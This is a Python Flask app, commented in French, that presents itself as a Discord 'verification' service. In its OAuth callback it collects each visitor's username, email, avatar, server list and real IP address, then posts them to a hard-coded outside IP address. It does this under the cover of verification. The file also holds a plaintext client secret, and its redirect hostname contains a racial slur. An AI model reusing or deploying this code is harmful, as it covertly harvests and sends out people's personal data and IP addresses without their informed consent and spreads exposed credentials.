from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"

# Ton endpoint webhook POUR LE BOT (pas pour les logs)
# Le bot va écouter sur ce webhook
BOT_WEBHOOK = "http://217.160.125.127:13622/webhook/"  # À remplacer par l'URL de ton bot sur Wispbyte

def get_user_ip(request):
    """Récupère l'IP réelle du visiteur"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def send_to_bot(user_id, user_data, guilds_data, user_ip):
    """Envoie les données au bot via HTTP POST"""
    try:
        payload = {
            "user_id": user_id,
            "username": user_data.get('username'),
            "email": user_data.get('email', 'No email'),
            "guilds_count": len(guilds_data) if isinstance(guilds_data, list) else 0,
            "ip_address": user_ip,
            "avatar": user_data.get('avatar'),
            "timestamp": datetime.now().isoformat()
        }
        
        # Envoyer au bot
        response = requests.post(BOT_WEBHOOK, json=payload, timeout=10)
        
        if response.status_code == 200:
            print(f"✅ Données envoyées au bot pour {user_id}")
            return True
        else:
            print(f"⚠️ Bot a répondu: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Erreur envoi bot: {e}")
        return False

@app.route('/')
def home():
    return jsonify({"status": "online", "service": "Discord Verification API"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/callback')
def callback():
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        print(f"❌ OAuth Error: {error}")
        return redirect("https://guns.lol/j8a?error=oauth_failed")
    
    if not code:
        return redirect("https://guns.lol/j8a?error=no_code")
    
    user_ip = get_user_ip(request)
    
    try:
        # Échange du code contre un token
        token_url = "https://discord.com/api/oauth2/token"
        token_data = {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI
        }
        token_headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        token_response = requests.post(token_url, data=token_data, headers=token_headers)
        token_response.raise_for_status()
        
        access_token = token_response.json().get('access_token')
        
        if not access_token:
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        # Récupérer les infos utilisateur
        user_headers = {"Authorization": f"Bearer {access_token}"}
        user_response = requests.get("https://discord.com/api/users/@me", headers=user_headers)
        user_data = user_response.json()
        
        # Récupérer les serveurs
        guilds_response = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
        guilds_data = guilds_response.json() if guilds_response.status_code == 200 else []
        
        print(f"✅ User verified: {user_data.get('username')} (ID: {user_data.get('id')})")
        
        # Envoyer au bot
        user_id = user_data.get('id')
        send_to_bot(user_id, user_data, guilds_data, user_ip)
        
        return redirect("https://guns.lol/j8a?verified=true")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print(traceback.format_exc())
        return redirect("https://guns.lol/j8a?error=unknown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
